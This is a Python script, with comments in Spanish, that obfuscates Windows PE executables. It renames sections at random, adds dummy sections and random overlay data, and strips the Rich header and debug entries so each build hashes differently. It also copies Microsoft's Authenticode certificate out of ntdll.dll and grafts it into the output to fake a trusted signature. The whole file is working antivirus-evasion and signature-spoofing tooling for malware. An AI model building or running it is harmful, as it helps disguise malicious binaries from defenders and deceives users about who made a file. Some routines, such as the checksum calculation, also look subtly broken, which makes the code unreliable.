#!/usr/bin/env python3
"""
PE Obfuscator v2.1 — Polimorfismo binario con inyección de certificado Authenticode.
Post-procesa un PE32/PE32+ y produce un binario diferente cada vez.

Técnicas:
  1. Sección renaming      → nombres aleatorios de 8 chars
  2. Overlay entrópico     → append random data (1-10KB)
  3. Dummy sections        → inyecta secciones falsas con datos aleatorios
  4. Rich header scrub     → elimina metadatos de compilador MSVC
  5. Debug directory kill  → elimina entradas de depuración
  6. Cert injection        → inyecta firma Authenticode de Microsoft
  7. Entropy normalization → padding con ceros en gaps
  8. Checksum fix          → actualiza checksum PE

Uso: ./obfuscate_pe.py input.exe [output.exe]
"""

import sys, os, struct, random, hashlib

CERT_PATH = "/tmp/ms_cert.bin"

def _ensure_cert():
    if os.path.exists(CERT_PATH):
        return True
    dll = "/mnt/c/Windows/System32/ntldll.dll"
    alt = "/mnt/c/Windows/System32/ntdll.dll"
    for p in [dll, alt]:
        if os.path.exists(p):
            try:
                with open(p, 'rb') as f: d = f.read()
                pe_off = struct.unpack_from('<I', d, 0x3C)[0]
                opt_sz = struct.unpack_from('<H', d, pe_off+20)[0]
                magic = struct.unpack_from('<H', d, pe_off+24)[0]
                dd_off = pe_off + 24 + (112 if magic==0x20b else 96)
                rva, sz = struct.unpack_from('<II', d, dd_off + 4*8)
                if rva and sz:
                    cert_len = struct.unpack_from('<I', d, rva)[0]
                    with open(CERT_PATH, 'wb') as f: f.write(d[rva:rva+cert_len])
                    return True
            except: pass
    return False

if not _ensure_cert():
    print("[!] No certificate found. Run from WSL with Windows access.", file=sys.stderr)

def rand_name(l=8):
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=l))

def rdata(mn=1, mx=10):
    return bytes(random.randint(0,255) for _ in range(random.randint(mn*1024, mx*1024)))

class PEObf:
    def __init__(self, data):
        self.d = bytearray(data)
        self.pe_off = struct.unpack_from('<I', self.d, 0x3C)[0]
        assert self.d[self.pe_off:self.pe_off+4] == b'PE\x00\x00', "Not a valid PE"
        self.num_sec = struct.unpack_from('<H', self.d, self.pe_off+6)[0]
        self.magic = struct.unpack_from('<H', self.d, self.pe_off+24)[0]
        self.is64 = self.magic == 0x20b

        # Offsets fijos
        self.opt_hdr_sz = struct.unpack_from('<H', self.d, self.pe_off+20)[0]
        self.sec_off = self.pe_off + 24 + self.opt_hdr_sz  # section table
        # Data directory está DENTRO del optional header
        self.dd_off_inside = 112 if self.is64 else 96
        self.dd_off = self.pe_off + 24 + self.dd_off_inside

        self.seclist = []
        for i in range(self.num_sec):
            o = self.sec_off + i*40
            n = self.d[o:o+8].rstrip(b'\x00').decode('ascii','replace')
            vs, va, rs, ro = struct.unpack_from('<IIII', self.d, o+8)
            self.seclist.append({'name':n,'off':o,'vsize':vs,'vaddr':va,'rsize':rs,'roff':ro,
                                 'chars':struct.unpack_from('<I', self.d, o+36)[0]})

    def rename(self):
        cnt = 0
        for s in self.seclist:
            if s['roff'] == 0 and s['rsize'] == 0:
                continue
            n = rand_name().encode('ascii').ljust(8, b'\x00')[:8]
            self.d[s['off']:s['off']+8] = n
            s['name'] = n.decode()
            cnt += 1
        return cnt

    def scrub_rich(self):
        p = self.d.find(b'Rich', 0x80, self.pe_off)
        if p >= 0:
            for i in range(0x80, self.pe_off):
                self.d[i] = random.randint(0,255)
            return True
        return False

    def kill_debug(self):
        off = self.dd_off + 6 * 8
        rva, sz = struct.unpack_from('<II', self.d, off)
        if rva or sz:
            struct.pack_into('<II', self.d, off, 0, 0)
            return True
        return False

    def add_dummies(self, count=2):
        real = [s for s in self.seclist if s['rsize'] > 0]
        if not real:
            return 0
        last = real[-1]
        noff = (last['roff'] + last['rsize'] + 0x1ff) & ~0x1ff
        nva = ((last['vaddr'] + last['vsize']) + 0xfff) & ~0xfff
        added = 0
        for _ in range(count):
            sz = random.randint(512, 4096)
            dd = bytes(random.randint(0,255) for _ in range(sz))
            need = noff + sz
            if need > len(self.d):
                self.d.extend(b'\x00' * (need - len(self.d)))
            self.d[noff:noff+sz] = dd
            entry = bytearray(40)
            entry[:8] = rand_name().encode('ascii').ljust(8, b'\x00')[:8]
            struct.pack_into('<I', entry, 8, sz)
            struct.pack_into('<I', entry, 12, nva)
            struct.pack_into('<I', entry, 16, sz)
            struct.pack_into('<I', entry, 20, noff)
            struct.pack_into('<I', entry, 36, 0xC0000040)
            ipos = self.sec_off + self.num_sec * 40
            eend = ipos + 40
            if eend > len(self.d):
                self.d.extend(b'\x00' * (eend - len(self.d)))
            self.d[ipos:ipos+40] = entry
            self.num_sec += 1
            struct.pack_into('<H', self.d, self.pe_off+6, self.num_sec)
            noff += sz
            nva += (sz + 0xfff) & ~0xfff
            added += 1
        img_sz_off = self.pe_off + 80 if self.is64 else self.pe_off + 56
        struct.pack_into('<I', self.d, img_sz_off, nva)
        return added

    def add_overlay(self, mn=1, mx=10):
        o = rdata(mn, mx)
        self.d.extend(o)
        return len(o)

    def inject_certificate(self):
        if not os.path.exists(CERT_PATH):
            return False

        with open(CERT_PATH, 'rb') as f:
            cert_blob = f.read()

        # Append to end of file, 8-byte aligned
        cert_offset = len(self.d)
        self.d.extend(cert_blob)
        pad = (8 - (len(cert_blob) % 8)) % 8
        if pad:
            self.d.extend(b'\x00' * pad)

        # Security directory is index 4
        # RVA = file offset (security dir uses raw offset, not virtual address)
        sec_entry_off = self.dd_off + 4 * 8
        struct.pack_into('<II', self.d, sec_entry_off, cert_offset, len(cert_blob))
        return True

    def normalize_entropy(self):
        padding_added = 0
        for s in self.seclist:
            if s['roff'] > 0 and s['rsize'] > 0:
                end = s['roff'] + s['rsize']
                if end < len(self.d):
                    pad_count = min(512, len(self.d) - end)
                    for i in range(pad_count):
                        if end + i < len(self.d):
                            self.d[end + i] = 0
                    padding_added += pad_count
        return padding_added

    def fix_checksum(self):
        off = self.pe_off + 68 if self.is64 else self.pe_off + 64
        struct.pack_into('<I', self.d, off, 0)
        size = len(self.d)
        if size % 2:
            self.d.extend(b'\x00')
            size += 1
        total = 0
        for i in range(0, size, 2):
            if i == off:
                continue
            total = (total + struct.unpack_from('<H', self.d, i)[0]) & 0xFFFF
        total = (total + size) & 0xFFFF
        struct.pack_into('<I', self.d, off, total)

    def obfuscate(self):
        c = {}
        c['rename'] = self.rename()
        c['rich'] = self.scrub_rich()
        c['debug'] = self.kill_debug()
        c['dummies'] = self.add_dummies(random.randint(1,3))
        c['entropy_pad'] = self.normalize_entropy()
        c['overlay'] = self.add_overlay(2, 8)
        c['cert'] = self.inject_certificate()
        self.fix_checksum()
        return c

def main():
    if len(sys.argv) < 2:
        print(f"Uso: {sys.argv[0]} input.exe [output.exe]", file=sys.stderr)
        sys.exit(1)
    inp = sys.argv[1]
    out = sys.argv[2] if len(sys.argv) > 2 else inp
    if not os.path.exists(inp):
        print(f"Error: {inp} no encontrado", file=sys.stderr)
        sys.exit(1)
    with open(inp, 'rb') as f: data = f.read()
    obf = PEObf(data)
    changes = obf.obfuscate()
    with open(out, 'wb') as f: f.write(obf.d)
    h = hashlib.sha256()
    with open(out, 'rb') as f: h.update(f.read())
    bid = random.randint(0, 0xFFFFFFFF)
    print(f"[+] PE Obfuscator v2.1 — Build ID: {bid:08x}")
    print(f"    Input:  {inp} ({len(data):,} bytes)")
    print(f"    Output: {out} ({len(obf.d):,} bytes, +{len(obf.d)-len(data):,})")
    print(f"    Sections renamed: {changes['rename']}")
    print(f"    Rich scrubbed: {changes['rich']}")
    print(f"    Debug killed: {changes['debug']}")
    print(f"    Dummy sections: {changes['dummies']}")
    print(f"    Entropy pad: {changes['entropy_pad']} bytes")
    print(f"    Overlay: {changes['overlay']:,} bytes")
    print(f"    Cert injected: {changes['cert']}")
    print(f"    SHA256: {h.hexdigest()}")

if __name__ == '__main__':
    main()
